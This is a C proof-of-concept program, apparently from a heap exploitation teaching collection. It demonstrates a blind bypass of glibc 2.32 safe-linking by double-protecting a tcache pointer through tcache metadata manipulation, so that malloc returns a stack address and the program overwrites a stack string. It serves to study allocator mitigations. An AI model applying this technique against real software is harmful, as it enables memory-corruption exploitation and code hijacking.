#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>

/* 
 * This method showcases a blind bypass for the safe-linking mitigation introduced in glibc 2.32. 
 * https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=a1a486d70ebcc47a686ff5846875eacad0940e41
 * 
 * NOTE: This requires 4 bits of bruteforce if the primitive is a write primitive, as the LSB will  
 * contain 4 bits of randomness. If you can increment integers, no brutefore is required.
 *
 * Safe-Linking is a memory protection measure using ASLR randomness to fortify single-linked lists. 
 * It obfuscates pointers and enforces alignment checks, to prevent pointer hijacking in t-cache.
 *
 * When an entry is linked in to the t-cache, the address is XOR'd with the address that free is 
 * called on, shifted by 12 bits. However if you were to link this newly protected pointer, it
 * would be XOR'd again with the same key, effectively reverting the protection. 
 * Thus, by simply protecting a pointer twice we effectively achieve the following:
 *	
 *                                  (ptr^key)^key = ptr
 *
 * The technique requires control over the t-cache metadata, so pairing it with a technique such as
 * house of water might be favourable.
 *
 * Technique by @udp_ctf - Water Paddler / Blue Water 
 */

int main(void) {
	// Prevent _IO_FILE from buffering in the heap
	setbuf(stdin, NULL);
	setbuf(stdout, NULL);
	setbuf(stderr, NULL);

	// Create the goal stack buffer
	char goal[] = "Replace me!";
	puts("============================================================");
	printf("Our goal is to write to the stack variable @ %p\n", goal);
	printf("String contains: %s\n", goal);
	puts("============================================================");
	puts("\n");

	// Step 1: Allocate
	puts("Allocate two chunks in two different t-caches:");
	
	// Allocate two chunks of size 0x38 for 0x40 t-cache
	puts("\t- 0x40 chunks:");
	void *a = malloc(0x38);
	void *b = malloc(0x38);
	printf("\t\t* Entry a @ %p\n", a);
	printf("\t\t* Entry b @ %p\n", b);

	// Allocate two chunks of size 0x18 for 0x20 t-cache
	void *c = malloc(0x18);
	void *d = malloc(0x18);
	puts("\t- 0x20 chunks:");
	printf("\t\t* Entry c @ %p\n", c);
	printf("\t\t* Entry d @ %p\n", d);
	puts("");

	// Step 2: Write an arbitrary value (or note the offset to an exsisting value)
	puts("Allocate a pointer which will contain a pointer to the stack variable:");

	// Allocate a chunk and store a modified pointer to the 'goal' array.
	void *value = malloc(0x28);
	// make sure that the pointer ends on 0 for proper heap alignemnt or a fault will occur
	*(long *)value = ((long)(goal) & ~(0xf));

	printf("\t* Arbitrary value (0x%lx) written to %p\n", *(long*)value, value);
	puts("");

	// Step 3: Free the two chunks in the two t-caches to make two t-cache entries in two different caches
	puts("Free the 0x40 and 0x20 chunks to populate the t-caches");

	puts("\t- Free 0x40 chunks:");
	// Free the allocated 0x38 chunks to populate the 0x40 t-cache
	free(a);
	free(b);
	printf("\t\t> 0x40 t-cache: [%p -> %p]\n", b, a);

	puts("\t- Free the 0x20 chunks");
	// Free the allocated 0x18 chunks to populate the 0x20 t-cache
	free(c);
	free(d);
	printf("\t\t> 0x20 t-cache: [%p -> %p]\n", d, c);
	puts("");

	// Step 4: Using our t-cache metadata control primitive, we will now execute the vulnerability
	puts("Modify the 0x40 t-cache pointer to point to the heap value that holds our arbitrary value, ");
	puts("by overwriting the LSB of the pointer for 0x40 in the t-cache metadata:");
	
	// Calculate the address of the t-cache metadata
	void *metadata = (void *)((long)(value) & ~(0xfff));

	// Overwrite the LSB of the 0x40 t-cache chunk to point to the heap chunk containing the arbitrary value
	*(unsigned int*)(metadata+0xa0) = (long)(metadata)+((long)(value) & (0xfff));

	printf("\t\t> 0x40 t-cache: [%p -> 0x%lx]\n", value, (*(long*)value)^((long)metadata>>12));
	puts("");

	puts("Allocate once to make the protected pointer the current entry in the 0x40 bin:");
	void *_ = malloc(0x38);
	printf("\t\t> 0x40 t-cache: [0x%lx]\n", *(unsigned long*)(metadata+0xa0));
	puts("");

	/* VULNERABILITY */	
	puts("Point the 0x20 bin to the 0x40 bin in the t-cache metadata, containing the newly safe-linked value:");
	*(unsigned int*)(metadata+0x90) = (long)(metadata)+0xa0;
	printf("\t\t> 0x20 t-cache: [0x%lx -> 0x%lx]\n", (long)(metadata)+0xa0, *(long*)value);
	puts("");
	/* VULNERABILITY */	

	// Step 5: Allocate twice to allocate the arbitrary value
	puts("Allocate twice to gain a pointer to our arbitrary value");
	
	_ = malloc(0x18);
	printf("\t\t> First  0x20 allocation: %p\n", _);
	
	char *vuln = malloc(0x18);
	printf("\t\t> Second 0x20 allocation: %p\n", vuln);
	puts("");

	// Step 6: Overwrite the goal string pointer and verify it has been changed
	strcpy(vuln, "XXXXXXXXXXX HIJACKED!");

	printf("String now contains: %s\n", goal);	
	assert(strcmp(goal, "Replace me!") != 0);
}
